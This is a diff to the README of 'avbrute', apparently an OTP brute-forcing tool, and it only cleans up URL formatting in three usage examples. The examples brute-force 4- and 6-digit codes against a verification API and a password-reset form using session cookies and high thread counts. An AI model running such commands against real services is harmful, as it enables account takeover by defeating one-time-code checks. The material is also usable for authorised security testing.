@@ -33,21 +33,21 @@ go build -o avbrute main.go
 **1. 4-digit code (JSON format):**
 
 ```bash
-./avbrute -u [http://127.0.0.1/api/verify](http://127.0.0.1/api/verify) -d '{"phone":"998901234567","code":"OTP"}' -r 4
+./avbrute -u http://127.0.0.1/api/verify -d '{"phone":"998901234567","code":"OTP"}' -r 4
 
 ```
 
 **2. 6-digit code, text match, and high threads:**
 
 ```bash
-./avbrute -u [http://127.0.0.1/api/verify](http://127.0.0.1/api/verify) -d '{"phone":"998901234567","code":"OTP"}' -r 6 -m "true" -t 500
+./avbrute -u http://127.0.0.1/api/verify -d '{"phone":"998901234567","code":"OTP"}' -r 6 -m "true" -t 500
 
 ```
 
 **3. Form-Data, specific range, and Cookie (expecting 302 Redirect):**
 
 ```bash
-./avbrute -u [https://target.com/reset](https://target.com/reset) -d "csrf=token&code=OTP" -r 56000-56900 -s 302 -c "session=xyz123"
+./avbrute -u https://target.com/reset -d "csrf=token&code=OTP" -r 56000-56900 -s 302 -c "session=xyz123"
 
 ```
 
